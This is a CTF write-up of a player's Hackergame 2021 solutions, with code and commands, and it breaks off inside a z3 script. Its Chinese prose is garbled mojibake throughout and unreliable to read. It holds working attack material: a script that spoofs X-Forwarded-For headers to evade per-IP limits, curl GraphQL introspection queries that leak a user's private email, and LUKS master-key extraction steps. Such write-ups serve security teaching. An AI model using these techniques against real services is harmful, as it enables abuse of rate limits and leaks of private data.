# Writeup

è®°å½•è‡ªå·±åœ¨ Hackergame 2021 çš„åšé¢˜æ€è·¯ï¼ŒåŸæ–‡åœ¨ä¸ªäºº [github](https://github.com/hzqmwne/hackergame2021-writeups/blob/master/players/hzqmwne/README.md ) ä¸Šã€‚  

ï¼ˆä»°æœ›ç¬¬ä¸€åçš„mcfxå¤§ä½¬ï¼ˆå¼€èµ›å‰å‡ å¤©ç«åŠ›å…¨å¼€ä¸åœåšé¢˜å´ä¹Ÿåªèƒ½çœ¼çœ‹mcfxå§‹ç»ˆæ¯”è‡ªå·±é«˜è‡³å°‘ä¸€åŠçš„åˆ†æ•°ï¼‰ï¼‰  
ï¼ˆå‘ç°æ‰€æœ‰éœ€è¦å†™å¤§é‡ä»£ç çš„é¢˜ç›®è‡ªå·±éƒ½æ²¡åšï¼‰  


## ç­¾åˆ°
```
http://202.38.93.111:10000/?page=1634964427
```
æ‰¾æ¯”èµ›æœŸé—´çš„æ—¶é—´æˆ³å¡«åˆ° `page=` çš„å‚æ•°é‡Œ  


## è¿›åˆ¶åå…­â€”â€”å‚ä¸Š
æ‰‹åŠ¨è¯»å›¾ï¼Œåå…­è¿›åˆ¶è½¬æ¢  
```python
print(bytes.fromhex("666c61677b5930555f5348305531445f6b6e30775f4830575f74305f43306e763372745f4845585f746f5f546578547d").decode())
```


## å»å§ï¼è¿½å¯»è‡ªç”±çš„ç”µæ³¢

æ€€ç–‘äººç”Ÿç¬¬ä¸€å¼¹ï¼šä¸ºä»€ä¹ˆè¿™ä¹ˆå¤šäººåšå‡ºæ¥çš„é¢˜æˆ‘ä¸ä¼šï¼Ÿï¼Ÿ  
é¢˜ç›®æåˆ°â€œæ— çº¿ç”µâ€ï¼Œæœåˆ°äº†[èˆªç©ºæ— çº¿ç”µ26è‹±æ–‡å­—æ¯è¯»æ³•](https://www.bilibili.com/read/cv5983192 )å’Œ[åŒ—çº¦éŸ³æ ‡å­—æ¯](https://zh.wikipedia.org/wiki/%E5%8C%97%E7%BA%A6%E9%9F%B3%E6%A0%87%E5%AD%97%E6%AF%8D )ï¼Œç¡®è®¤å°±æ˜¯è¿™ä¸ªã€‚  
é¢˜ç›®æåˆ°â€œå½•éŸ³çš„é€Ÿåº¦æœ‰æ‰€æ”¹å˜â€ï¼Œå°è¯•å‡é€Ÿæ’­æ”¾ï¼Œå¤§çº¦å‡åˆ°0.3-0.4å€èŠ‚å¥æ¯”è¾ƒåˆç†ï¼Œèƒ½å‹‰å¼ºè¾¨è®¤å‡ºå‡ ä¸ªå•è¯ï¼Œä½†å®Œå…¨å¬ä¸æ¸…ã€‚  

è‡ªæ­¤å¡é¢˜  

èµ°å¤´æ— è·¯ä¸­ï¼Œåæ¥è£…äº†vlcæ’­æ”¾å™¨ï¼Œå„ç§ä¹±è°ƒï¼Œå·¥å…·-æ•ˆæœåŠæ»¤é•œ-éŸ³é¢‘æ•ˆæœ-é«˜çº§-è°ƒèŠ‚éŸ³è°ƒï¼Œæ»‘å—æ‹–åˆ° -12.0 semitonesï¼Œå£°éŸ³ç«‹åˆ»å˜å¾—æå…¶æ¸…æ™°ã€‚ä¹‹åå°±æ˜¯å¬å•è¯å¯¹ç…§è¡¨æ ¼æ‰¾å­—æ¯ã€‚  
ï¼ˆéå¸¸ä¸ç†è§£å…¶ä»–äººæ˜¯å¦‚ä½•å¿«é€Ÿæƒ³åˆ°è°ƒèŠ‚éŸ³è°ƒçš„ï¼‰  


## çŒ«å’ªé—®ç­” Pro Max

æ€€ç–‘äººç”Ÿç¬¬äºŒå¼¹ï¼šé™¤äº†è‡ªå·±ï¼Œæ’è¡Œæ¦œä¸Šå…¶ä»–çš„äººå‡ ä¹éƒ½åšå‡ºäº†è¿™é“é¢˜å’Œä¸Šé“é¢˜â€¦â€¦  
æŒ‰æƒ¯ä¾‹ï¼Œlugçš„ç½‘ç«™ [https://lug.ustc.edu.cn/](https://lug.ustc.edu.cn/ )è‚¯å®šæ˜¯ä¿¡æ¯çš„é‡è¦æ¥æºã€‚  
2. äº”æ˜Ÿç¤¾å›¢ï¼šè§[https://lug.ustc.edu.cn/wiki/intro/](https://lug.ustc.edu.cn/wiki/intro/ )ï¼Œé™¤äº†2021å¹´æœªçŸ¥ï¼Œåˆ—å‡ºçš„è‡³å°‘æœ‰4æ¬¡ã€‚ä½†è¿™ä¹ˆå¥½çš„ç¤¾å›¢æ²¡é“ç†2021å¹´ä¸æ˜¯äº”æ˜Ÿï¼Œæ›´å¯èƒ½æ˜¯ä¿¡æ¯æœªåŠæ—¶æ›´æ–°ï¼Œä½†ä¸é‡è¦ï¼Œå…¶ä»–é¢˜ç¡®å®šå4ä¸ª5åˆ†åˆ«è¯•ä¸€ä¸‹å°±å¥½ã€‚  
3. æ‰¾lugçš„å†å²æ–°é—»ï¼Œæœç´¢â€œæ´»åŠ¨å®¤â€ï¼Œæ‰¾åˆ°[https://lug.ustc.edu.cn/news/2016/06/new-activity-room-in-west-library/](https://lug.ustc.edu.cn/news/2016/06/new-activity-room-in-west-library/ )ï¼Œç…§ç‰‡é‡Œæœ‰ç­”æ¡ˆã€‚  
4. Googleæœç´¢â€œSIGBOVIK 2021â€ï¼Œæ‰¾åˆ°è®ºæ–‡åˆé›† [http://sigbovik.org/2021/proceedings.pdf](http://sigbovik.org/2021/proceedings.pdf )ï¼Œåœ¨ç¬¬216é¡µ `The Newcomb-Benford Law, Applied to Binary Data: An Empirical and Theoretic Analysis`ï¼Œç•¥è¯»ä¸€éæ–‡ç« ï¼Œæ•°æ®é›†çš„ä¸ªæ•°å³æ–‡æœ«å›¾ç‰‡çš„ä¸ªæ•°ã€‚  
5. Googleæœç´¢ ietf 2021 Protocol Police ç­‰å…³é”®è¯ï¼Œæ‰¾åˆ° rfc8962 [https://datatracker.ietf.org/doc/html/rfc8962](https://datatracker.ietf.org/doc/html/rfc8962 )ï¼Œç­”æ¡ˆåœ¨ç¬¬6èŠ‚ã€‚   

è¿™4é¢˜éƒ½ä¸éš¾ï¼Œä½†ç¬¬1é¢˜ç€å®æäººã€‚  
ç™¾åº¦ã€Googleã€â€¦â€¦å„ç§æœç´¢ã€å˜æ¢å…³é”®è¯æŸ¥æ‰¾â€œä¸­ç§‘å¤§â€â€œä¿¡æ¯å®‰å…¨ä¿±ä¹éƒ¨â€â€œç« ç¨‹â€â€œç¤¾å›¢ç« ç¨‹â€â€œç¤¾å›¢ä»£è¡¨å¤§ä¼šâ€â€œSEC@USTCâ€â€œsec.ustc.edu.cnâ€ç­‰é€šé€šæ— è§£ã€‚  
æ‰¾äº†lugçš„æ´»åŠ¨è®°å½• [https://lug.ustc.edu.cn/wiki/lug/events/](https://lug.ustc.edu.cn/wiki/lug/events/ )ï¼Œæ‰€æœ‰â€œå¤§ä¼šâ€â€œæ´»åŠ¨â€ç›¸å…³çš„æ—¥æœŸéƒ½è¯•äº†ä¸€éï¼Œä»ç„¶ä¸å¯¹ã€‚  
FTP [https://ftp.lug.ustc.edu.cn/%E7%A4%BE%E5%9B%A2%E7%AE%A1%E7%90%86/%E7%AB%A0%E7%A8%8B/](https://ftp.lug.ustc.edu.cn/%E7%A4%BE%E5%9B%A2%E7%AE%A1%E7%90%86/%E7%AB%A0%E7%A8%8B/ )æ‰¾å†å²ç« ç¨‹ï¼Œè¯•å›¾è·å¾—è››ä¸é©¬è¿¹ï¼Œæ— æœã€‚  

å¡äº†å‡ å¤©  

éå¸¸å¶ç„¶ï¼Œæ‰æƒ³åˆ°ç½‘é¡µå½’æ¡£ï¼Œä¸Šarchive.orgæŸ¥sec.ustc.edu.cnï¼Œæ‰ç»ˆäºæ‰¾åˆ°ç­”æ¡ˆï¼š[https://web.archive.org/web/20170515053637/http://sec.ustc.edu.cn/doku.php/codes](https://web.archive.org/web/20170515053637/http://sec.ustc.edu.cn/doku.php/codes )  


## å–ç“œ

ä¸å…¶è¯´æ˜¯Webï¼Œå®é™…æ›´åƒMisc  
è¿™é¢˜ä¹Ÿå¡äº†ä¸€äº›æ—¶é—´ï¼ˆçœ‹æ¥è‡ªå·±å¯¹Miscé¢˜ç¡®å®ç¼ºä¹æ„Ÿè§‰ï¼‰  

åç«¯æ˜¯phpï¼ŒæŸ¥åˆ°äº†phpæ•´æ•°æº¢å‡ºçš„ä¸€äº›æ–‡æ¡£ï¼Œæ„Ÿè§‰æ–¹å‘åº”è¯¥å°±æ˜¯è¿™ä¸ªã€‚  
ä¸€é€šä¹±è¯•ï¼Œå‘ç°æ”¾ 10000000000000000000 ä¸ª 9 æ–¤ç“œèƒ½å¾—åˆ° -9223372036854775808 ï¼ˆæ¢ç®—æˆåå…­è¿›åˆ¶æ˜¯0x8000000000000000ï¼Œå³INT64_MINï¼‰ï¼Œå®Œå…¨ä¸èƒ½ç†è§£ã€‚  
ç„¶åæ”¾ 1024819115206086200 ä¸ª 9 æ–¤ç“œå¾—åˆ° -8ã€‚   
å†æ”¾ 1 ä¸ª 9 æ–¤ç“œå¾—åˆ° 1ã€‚

ä»¥ä¸Šé‡å¤ä¸€éå¾—åˆ° 2ï¼Œå†æ”¾æœ€å 2 ä¸ª 9 æ–¤ç“œå³å¯ã€‚


## é€æ˜çš„æ–‡ä»¶

å„ç§ä¸­æ‹¬å·ã€åˆ†å·ç­‰ï¼Œæ˜æ˜¾çš„ç»ˆç«¯è½¬ä¹‰åºåˆ—çš„ç‰¹å¾ã€‚  
æ‰¹é‡æŠŠ"\["æ›¿æ¢ä¸º"\\033\["ï¼Œç„¶åcatï¼Œå‘ç°ç»ˆç«¯çš„æŸäº›åœ°æ–¹å˜ä¸ºäº†é€æ˜çš„ã€‚  

è€ƒè™‘å…ˆæŠŠç»ˆç«¯å¡«æ»¡å­—ç¬¦ï¼Œæˆ‘çš„æ–¹æ³•æ˜¯ `export PS1="##################################################################"`ï¼Œç„¶åæŒ‰å›è½¦å¡«å……å…¨å±çš„ `#`ï¼Œå†catæ–‡ä»¶å³å¯ã€‚  
ï¼ˆä¸ªäººè§‰å¾—flagæ‹¼æˆçš„å­—ç¬¦ç”»ï¼Œæœ‰çš„å­—ç¬¦è¿˜æ˜¯æ¯”è¾ƒéš¾è¾¨è®¤çš„â€¦â€¦ï¼‰  


## æ—…è¡Œç…§ç‰‡

è“è‰²çš„KFCæ¯”è¾ƒå°‘è§ï¼Œåº”è¯¥æ˜¯è§£é¢˜çš„çªç ´å£ã€‚å»ç½‘ä¸Šæœç´¢å‘ç°è¿˜æ˜¯ä¸€ä¸ªç½‘çº¢æ‰“å¡åœ°ï¼ˆç§¦çš‡å²›æ–°å¥¥æµ·åº•ä¸–ç•Œåº—ï¼‰ã€‚  
æ‰¾åˆ°çš„ä¸€äº›æ‰“å¡ç…§ç‰‡ [https://www.xiaohongshu.com/discovery/item/5ec5065e000000000101eacc](https://www.xiaohongshu.com/discovery/item/5ec5065e000000000101eacc )  
å»åœ°å›¾æœç´¢è¯¥åº—é“ºï¼Œæ‰¾åˆ°ç”µè¯ã€‚  

æ—è¾¹å»ºç­‘çš„ä¸‰ä¸ªå¤§å­—ï¼Œç™¾åº¦è¡—æ™¯åœ°å›¾å¹¶æ²¡æœ‰æ‰¾åˆ°è“è‰²çš„KFCï¼ˆèµ›åçœ‹é¢˜è§£ï¼Œå¤§å¤šæ•°äººéƒ½æ˜¯ä»è¡—æ™¯åœ°å›¾çœ‹åˆ°çš„ï¼Œwhyï¼Ÿï¼Ÿï¼‰ï¼›ç½‘çº¢ä»¬çš„æ‰“å¡ç…§ç‰‡åˆéå¸¸ç²¾è‡´ï¼ŒKFCå‘¨è¾¹çš„å»ºç­‘ä¸€ç‚¹éƒ½æ²¡æœ‰ä¸Šé•œã€‚  
æœ€åæ‰¾åˆ°äº†è¿™æ®µè§†é¢‘ [https://www.bilibili.com/video/av287639472/](https://www.bilibili.com/video/av287639472/ )ï¼Œé‡Œé¢æœ‰ä¸€ä¸ªé•œå¤´å±•ç¤ºäº†æ—è¾¹å»ºç­‘ã€‚  

æ¥¼å±‚ç›´æ¥æ•°å¯¹é¢æ¥¼ï¼›é¢æœæ–¹å‘å¯ç»“åˆåœ°å›¾é‡Œæ ‡å‡ºçš„æ–¹å‘ä»¥åŠæµ·çš„æ–¹ä½ï¼›æ‹æ‘„æ—¶é—´å‚ç…§åœ°é¢ç‰©ä½“çš„å½±å­ã€‚  


## FLAG åŠ©åŠ›å¤§çº¢åŒ…

IPåœ°å€ä¼ªé€ ï¼Œç¬¬ä¸€ååº”æ˜¯ `X-Forwarded-For` çš„httpå¤´ï¼Œè¯•äº†ä¸‹å‘ç°å¯è¡Œã€‚  
å†™è„šæœ¬ï¼Œå› ä¸ºæ²¡æ³¨æ„åˆ°æ¥å£è¿”å›æç¤ºæ¯ä¸ª/8ç½‘æ®µåªèƒ½åŠ©åŠ›ä¸€æ¬¡ï¼Œæ‰€ä»¥ç›´æ¥éšæœºç”Ÿæˆäº†32ä½ipv4åœ°å€ï¼Œ10åˆ†é’Ÿå†…çš„æˆåŠŸç‡å¾ˆä½ï¼Œè·‘äº†å¾ˆå¤šè½®è„šæœ¬æ‰æˆåŠŸä¸€æ¬¡ã€‚  
```python
import requests
import time
import random

seen = set()

for i in range(2560000):
    x = random.getrandbits(32)
    while x in seen:
        x = random.getrandbits(32)
    seen.add(x)
    '''
    a = random.randrange(0,256)
    b = random.randrange(0,256)
    c = random.randrange(0,256)
    d = random.randrange(0,256)
    '''
    a = (x>>24) & 0xff
    b = (x>>16) & 0xff
    c = (x>>8) & 0xff
    d = x & 0xff
    ip = f"{a}.{b}.{c}.{d}"
    data = {"ip": ip}
    headers = {"X-Forwarded-For": ip}
    address = "http://202.38.93.111:10888/invite/<>"    # address need to modify
    r = requests.post(address, data=data, headers=headers)
    print(ip, r.text)
    if ("æ“ä½œé€Ÿåº¦å¤ªå¿«äº†" in r.text):
        time.sleep(1)
    if ("é‡å¤çš„" in r.text):
        continue
    time.sleep(0.5)
```


## Amnesia

### è½»åº¦å¤±å¿†

å­—ç¬¦ä¸²å¸¸é‡é»˜è®¤ä¼šæ”¾åˆ°.rodataæ®µï¼Œé0å…¨å±€å˜é‡é»˜è®¤ä¼šæ”¾åˆ°.dataæ®µã€‚ä½†æ˜¯å±€éƒ¨å˜é‡é»˜è®¤åœ¨æ ˆä¸Šï¼Œä¸å—å½±å“ã€‚  
```c
#include <unistd.h>

int main(void) {
	char buf[] = "Hello, world!";
	write(1, buf, 13);
	return 0;
}
```
åœ¨ä¼˜åŒ–çº§åˆ«ä¸é«˜ä¸”å­—ç¬¦ä¸²ä¸å¤ªé•¿çš„æƒ…å†µä¸‹ï¼Œä¸Šé¢å¯¹char []çš„åˆå§‹åŒ–æ–¹å¼ä¼šç”ŸæˆæŠŠæ•´æ•°æ”¾å…¥å†…å­˜çš„æŒ‡ä»¤ï¼Œå› æ­¤å¯è¡Œã€‚  
ï¼ˆå¦‚æœåˆå§‹åŒ–å­—ç¬¦ä¸²å¾ˆé•¿ä¸”ä¼˜åŒ–çº§åˆ«å¾ˆé«˜ï¼Œç¼–è¯‘å™¨ä¼šæŠŠåˆå§‹åŒ–çš„å¸¸é‡å­—ç¬¦ä¸²æ”¾å…¥.rodataç„¶ååœ¨ä»£ç ä¸­ç”Ÿæˆå¤åˆ¶çš„æŒ‡ä»¤ï¼‰  

### è®°å¿†æ¸…é™¤

ä»¥ä¸‹è§£æ³•åº”è¯¥ä¸ç¼–è¯‘å™¨ç‰ˆæœ¬ã€æ¶æ„ã€ä¼˜åŒ–çº§åˆ«éƒ½æ— å…³ã€‚ï¼ˆå³ä½¿.text, .data, .rodataä¸‰ä¸ªæ®µå…¨éƒ¨å»é™¤æ‰ä¹Ÿå¯ä»¥ï¼‰  
```c
__attribute__((section(".plt")))
static void preinit(void) {
	char buf[] = "Hello, world!";
	unsigned int ret;
	__asm__ __volatile__ ("int $0x80" : "=a"(ret) : "a"(4), "b"(1), "c"(buf), "d"(13) : "memory");
	__asm__ __volatile__ ("int $0x80" : "=a"(ret) : "a"(1), "b"(0) : "memory");
}

__attribute__((section(".preinit_array"))) void (*preinitarray[])(void) = { &preinit };

int main(void) {
	return 0;
}
```

ELFæ–‡ä»¶æœ‰sectionå’Œsegmentï¼Œå…¶ä¸­sectionç”±Section Headerç´¢å¼•ï¼Œsegmentç”±Program Headerç´¢å¼•ã€‚  
ç¼–è¯‘å™¨ç”Ÿæˆä»£ç æ—¶ï¼Œä¼šæŒ‰ç…§é»˜è®¤çš„specæŠŠæºä»£ç çš„ä¸åŒéƒ¨åˆ†æ”¾å…¥ä¸åŒçš„sectionä¸­ï¼ˆä¾‹å¦‚ä»£ç æ”¾å…¥.textï¼Œå…¨å±€é0å¸¸é‡æ”¾åˆ°.dataç­‰ï¼‰ï¼Œåœ¨ä»£ç ä¸­å¯ä»¥é€šè¿‡__attribute__((section("???")))æ‰‹åŠ¨é‡æ–°æŒ‡å®šã€‚  
sectionå’Œsegmentçš„å…³ç³»ï¼šåœ¨ç¼–è¯‘æœŸé“¾æ¥æ—¶ï¼Œé“¾æ¥å™¨ldä¼šæŒ‰ç…§é»˜è®¤çš„ldscriptï¼ˆld --verboseå¯æŸ¥çœ‹ï¼‰æŠŠæŸäº›sectionåˆå¹¶åœ¨ä¸€èµ·ä½œä¸ºä¸€ä¸ªsegmentã€‚`readelf -l` å¯ä»¥æŸ¥çœ‹è¿™ä¸ªæ˜ å°„å…³ç³»ã€‚  
Linuxå†…æ ¸åŠ è½½ELFæ–‡ä»¶æ—¶åªçœ‹segmentï¼Œå¿½ç•¥sectionï¼Œå†…æ ¸ä¼šä¸ºProgram Headerä¸­æ ‡è¯†ä¸ºLOADçš„segmentæŒ‰ç…§æŒ‡ç¤ºçš„å†…å­˜åœ°å€å’Œæƒé™å»ºç«‹å†…å­˜æ˜ å°„ã€‚  

å¯¹äºåŠ¨æ€é“¾æ¥çš„ç¨‹åºï¼ŒProgram Headerä¸­æœ‰ä¸€ä¸ªtypeä¸ºINTERPçš„segmentï¼ŒæŒ‡å®šäº†åŠ¨æ€é“¾æ¥å™¨`ld.so`çš„è·¯å¾„ã€‚execveç³»ç»Ÿè°ƒç”¨ä»å†…æ ¸è¿”å›ä¹‹åï¼Œç¨‹åºè®¡æ•°å™¨pcä¼šåœç•™åœ¨`ld.so`çš„entrypointä¸Šï¼Œè€Œä¸æ˜¯è¯¥elfç¨‹åºæœ¬èº«çš„entrypointä¸Šã€‚  

ä¹‹åçš„æ‰§è¡Œè·¯å¾„ï¼š
```
entrypoint (ld.so) -> PREINIT_ARRAY (elf) -> _start (elf) -> __libc_start_main (libc.so.6) -> INIT_ARRAY (elf) -> main (elf)
```
æ‰€ä»¥ï¼Œåœ¨è¿›å…¥elfçš„å…¥å£ç‚¹_startä¹‹å‰ï¼Œld.soä¼šå…ˆè°ƒç”¨.preinit_arrayèŠ‚æŒ‡å®šçš„å‡½æ•°ï¼Œæ­¤æ—¶è¿˜æœªè§¦åŠåˆ°elfæ–‡ä»¶çš„.textèŠ‚ã€‚è‡³äºå‡½æ•°æœ¬èº«æ‰€åœ¨çš„sectionä¸ä¸€å®šæ˜¯.textï¼Œåªè¦æœ€ç»ˆèƒ½è¿›å…¥æœ‰æ‰§è¡Œæƒé™çš„LOAD segmentå³å¯ã€‚  
mainå‡½æ•°åªæ˜¯ä¸ºäº†é€šè¿‡é“¾æ¥å™¨çš„æ£€æŸ¥ï¼ˆå› ä¸ºä¸èƒ½ä¿®æ”¹é“¾æ¥è„šæœ¬ï¼Œæ‰€ä»¥æ— æ³•è¦†ç›–crt1.oçš„é»˜è®¤_startå‡½æ•°ï¼‰ã€‚  
ä¸ºäº†å‡å°‘æœªçŸ¥çš„å¤æ‚æ€§ï¼Œ.preinit_arrayå‡½æ•°æ²¡æœ‰è°ƒç”¨ä»»ä½•åº“å‡½æ•°ï¼Œè€Œæ˜¯ç›´æ¥ç”¨å†…è”æ±‡ç¼–è°ƒç”¨writeå’Œexitç³»ç»Ÿè°ƒç”¨ã€‚  

ï¼ˆ.preinit_arrayæ˜¯ä»æŸä¸ªå›½å¤–æ¯”èµ›ä¸­è§åˆ°çš„ï¼Œä»é‚£ä¹‹åå°è±¡ä¸€ç›´å¾ˆæ·±åˆ»ï¼‰  
ï¼ˆåˆšå¼€å§‹æ²¡æœ‰ä»”ç»†è¯»é¢˜ï¼Œèµ›åçœ‹writeupæ‰å‘ç°é¢˜ç›®åªæ˜¯æŠŠ.textæ®µæŠ¹é›¶è€Œä¸æ˜¯ç›´æ¥åˆ æ‰ã€‚ä¸ªäººè®¤ä¸ºé¢˜ç›®æœ€å¥½åº”è¯¥æ˜¯ç›´æ¥åˆ æ‰.textæ®µè€Œä¸æ˜¯ä»…ä»…æŠ¹é›¶ï¼‰  


## å›¾ä¹‹ä¸Šçš„ä¿¡æ¯

æœç´¢ GraphQL ç›¸å…³çš„èµ„æ–™ï¼Œæ‰¾åˆ°ä¸€ç¯‡æ–‡ç«  [https://blog.csdn.net/he_and/article/details/112389292](https://blog.csdn.net/he_and/article/details/112389292 )  
æ–‡ç« æåˆ°äº† GraphQLå†…çœæœºåˆ¶ï¼š__schemaï¼Œ__typeï¼Œç…§åšå°±å¥½  

```shell
curl 'http://202.38.93.111:15001/graphql' -H 'Cookie: <>' --data-raw '{"query":"{ __schema { types {name} } }"}'
curl 'http://202.38.93.111:15001/graphql' -H 'Cookie: <>' --data-raw '{"query":"{ __schema { types {name\nfields{name}} } }"}'
curl 'http://202.38.93.111:15001/graphql' -H 'Cookie: <>' --data-raw '{"query":"{ __schema { types {name\nfields{name\nargs{name}type{name}}} } }"}'
curl 'http://202.38.93.111:15001/graphql' -H 'Cookie: <>' --data-raw '{"query":"{ user(id: 1) { id\nusername\nprivateEmail }}"}'
```


## Easy RSA

get_på‡½æ•°ï¼šæ³¨æ„åˆ°xæ˜¯è´¨æ•°ï¼Œyå’Œxå·®å€¼å¾ˆå°ï¼Œæƒ³åˆ°å¨å°”é€Šå®šç†ï¼ˆå¦‚æœpæ˜¯è´¨æ•°ï¼Œåˆ™ (p-1)!=-1(mod p)ï¼‰ï¼Œå¯ä»¥ä¼˜åŒ–æ‰yçš„é˜¶ä¹˜  
get_qå‡½æ•°ï¼šé€šè¿‡sympy.prevprimeä¸æ–­æ‰¾å‰ä¸€ä¸ªè´¨æ•°æ¢å¤valueæ•°ç»„  
æ¢å¤qå’Œmæ˜¯RSAå¸¸è§„è¿ç®—  

ä»£ç ï¼šï¼ˆPython 3.8 åŠä»¥åç‰ˆæœ¬çš„å†…å»ºpowå‡½æ•°æ”¯æŒè´ŸæŒ‡æ•°æ¨¡å¹‚ï¼Œæ— éœ€ç¬¬ä¸‰æ–¹åº“ï¼‰
```python
import sympy

e = 65537
c = 110644875422336073350488613774418819991169603750711465190260581119043921549811353108399064284589038384540018965816137286856268590507418636799746759551009749004176545414118128330198437101472882906564195341277423007542422286760940374859966152871273887950174522820162832774361714668826122465471705166574184367478

x = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451
y = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439

p = x-1
for i in range(y+1, x):
    p = p*pow(i, -1, x) % x
p = sympy.nextprime(p)

value = [None]*10
value[-1] = 80096058210213458444437404275177554701604739094679033012396452382975889905967
for i in range(8, -1, -1):
    value[i] = sympy.prevprime(value[i+1])
value_q = 5591130088089053683141520294620171646179623062803708281023766040254675625012293743465254007970358536660934858789388093688621793201658889399155357407224541324547522479617669812322262372851929223461622559971534394847970366311206823328200747893961649255426063204482192349202005330622561575868946656570678176047822163692259375233925446556338917358118222905050574458037965803154233167594946713038301249145097770337253930655681648299249481985768272321820718607757023350742647019762122572886601905212830744868048802864679734428398229280780215896045509020793530842541217790352661324630048261329493088812057300480085895399922301827190211956061083460036781018660201163819104150988531352228650991733072010425499238731811243310625701946882701082178190402011133439065106720309788819

phiq = 1
nq = 1
for i in range(10):
    phiq *= value[i]-1
    nq *= value[i]
q = pow(value_q, pow(e,-1,phiq), nq)
q = sympy.nextprime(q)

phi = (p-1)*(q-1)

d = pow(e, -1, phi)

m = pow(c, d, p*q)

print(hex(m))
print(m.to_bytes((m.bit_length()+7)//8, 'big'))
```


## åŠ å¯†çš„ U ç›˜

LUKSé€šè¿‡ä¸»å¯†é’¥(master key)åŠ å¯†ç£ç›˜æ•°æ®ï¼Œç”¨æˆ·å¯†ç ä»…ç”¨æ¥åŠ å¯†ä¸»å¯†é’¥ï¼Œä¿®æ”¹å¯†ç é»˜è®¤ä¸æ”¹å˜ä¸»å¯†é’¥ã€‚ï¼ˆè¿™ä¹Ÿæ˜¯å‡ å¤©åæ‰ååº”è¿‡æ¥çš„ï¼‰  

æŒ‰ç…§å¸¸è§„æ­¥éª¤ï¼ŒæŒ‚è½½day1.imgï¼Œæå–master keyï¼Œç„¶åè§£å¯†day2.img  

ä½†æ˜¯dmsetupæå–master keyæ—¶é‡åˆ°äº†é—®é¢˜ï¼Œåªèƒ½è·å¾—ä¸€ä¸ªUUIDï¼Œæ²¡æœ‰keyã€‚ï¼ˆèµ›åçœ‹writeupï¼Œå¥½åƒæœ‰çš„äººæ²¡é‡åˆ°è¿™ä¸ªé—®é¢˜ï¼‰  
ç»è¿‡æœç´¢æ‰¾åˆ° [https://gitlab.com/cryptsetup/cryptsetup/-/issues/453](https://gitlab.com/cryptsetup/cryptsetup/-/issues/453 )ï¼ŒåŸå› ä¸LUKS2å’Œå†…æ ¸çš„keyringæœºåˆ¶æœ‰å…³ï¼ŒæŒ‰æ–‡ç« æ‰€è¿°åœ¨cryptsetupæ—¶æ·»åŠ `--disable-keyring`å³å¯ã€‚  

å®Œæ•´çš„æ­¥éª¤å¦‚ä¸‹ï¼š
```shell
sudo losetup -P -f day1.img
sudo losetup -P -f day2.img

sudo cryptsetup --disable-keyring luksOpen /dev/loop0p1 myusb1    # è¾“å…¥é¢˜ç›®ç»™çš„å¯†ç 
sudo dmsetup table --showkeys myusb1    # å¯¼å‡ºä¸»å¯†é’¥
echo <è¿™é‡Œæ˜¯ä¸Šä¸€æ­¥çœ‹åˆ°çš„ä¸»å¯†é’¥> | xxd -r -p > master_key.bin

sudo cryptsetup --master-key-file=master_key.bin luksOpen /dev/loop1p1 myusb2    # é€šè¿‡ä¸»å¯†é’¥ç›´æ¥æŒ‚è½½day2.img
sudo mount /dev/mapper/myusb2 /mnt
cat /mnt/flag.txt

sudo cryptsetup luksClose myusb2
sudo losetup -d /dev/loop1
sudo cryptsetup luksClose myusb1
sudo losetup -d /dev/loop0
```


## èµ›åšå¨æˆ¿

é˜…è¯»ä»£ç ï¼Œå‘ç°æ¯ä¸€å¤©çš„èœè°±æ˜¯æ ¹æ®å·²ä¿å­˜çš„ç¨‹åºçš„sha256ç”Ÿæˆçš„ã€‚ç†è®ºä¸Šï¼Œè¿™æ˜¯ä¸å¯é¢„æµ‹çš„ã€‚  

### Level 0
èœè°±åªæœ‰4ç§ï¼Œå¾ˆå®¹æ˜“ç¢°æ’åˆ°æ°å¥½æ»¡è¶³çš„ï¼š
```
å‘å³ 1 æ­¥
æ‹¿èµ· 1 ä¸ªç‰©å“
å‘ä¸‹ 1 æ­¥
å‘å·¦ 1 æ­¥
æ”¾ä¸‹ 1 ä¸ªç‰©å“
å‘å³ 2 æ­¥
å‘ä¸Š 1 æ­¥
æ‹¿èµ· 1 ä¸ªç‰©å“
å‘ä¸‹ 1 æ­¥
å‘å·¦ 2 æ­¥
æ”¾ä¸‹ 1 ä¸ªç‰©å“
```

### Level 1
èœè°±åªæœ‰ä¸€ç§ï¼Œç¨‹åºæœ‰72è¡Œçš„é•¿åº¦é™åˆ¶ï¼Œç”¨å¾ªç¯ï¼š
```
å‘å³ 1 æ­¥
æ‹¿èµ· 73 ä¸ªç‰©å“
å‘ä¸‹ 1 æ­¥
å‘å·¦ 1 æ­¥
æ”¾ä¸‹ 1 ä¸ªç‰©å“
å¦‚æœæ‰‹ä¸Šçš„ç‰©å“å¤§äºç­‰äº 1 å‘ä¸Šè·³è½¬ 1 è¡Œ
```

### Level 2
æƒ³åˆ°äº†çˆ†ç ´çš„å¯èƒ½æ€§ï¼Œä½†æ˜¯ 32\*\*6/128 = 8388608 è§‰å¾—å¤ªå¤ªä¸ç°å®ï¼ˆæ²¡æƒ³åˆ°è¿™ç«Ÿç„¶æ˜¯é¢„æœŸï¼‰  

### Level 3
çœ‹åˆ°ç»™äº†å¾ˆå¤šç›˜å­æƒ³åˆ°äº†å¯èƒ½è¦åˆ©ç”¨ç¼–ç ï¼Œä½†æ²¡æ³¨æ„åˆ°å‰ä¸€å¤©çš„æ”¾ä¸‹çš„ç›˜å­åœ¨ç¬¬äºŒå¤©ä¸æ¸…ç©º  


## ç¯ï¼Œç­‰ç¯ç­‰ç¯

### Level 0
æ¯ä¸ªæ ¼å­æœ€ç»ˆçš„æ•°å­—å¯ä»¥è¡¨ç¤ºä¸ºæ¯ä¸ªæ ¼å­è¢«æŒ‰ä¸‹æ¬¡æ•°çš„çº¿æ€§ç»„åˆã€‚  
æ„é€ ä¸€ä¸ªçº¿æ€§æ–¹ç¨‹ç»„ï¼Œç„¶ååœ¨æ¨¡256çš„æ„ä¹‰ä¸‹æ±‚è§£ã€‚  
ä¸æƒ³æ‰‹å†™é«˜æ–¯æ¶ˆå…ƒï¼ˆæœ¬åœ°ä¹Ÿæ²¡æœ‰sageç¯å¢ƒï¼‰ï¼Œç”¨z3æ±‚è§£ï¼š
```python
from z3 import *
import requests

targetmap = [
    [189,189,189,189,189,33,33,33,189,189,189,189],
    [189,189,189,33,33,33,189,33,44,189,189,189],
    [189,189,189,189,189,33,33,33,33,189,189,189],
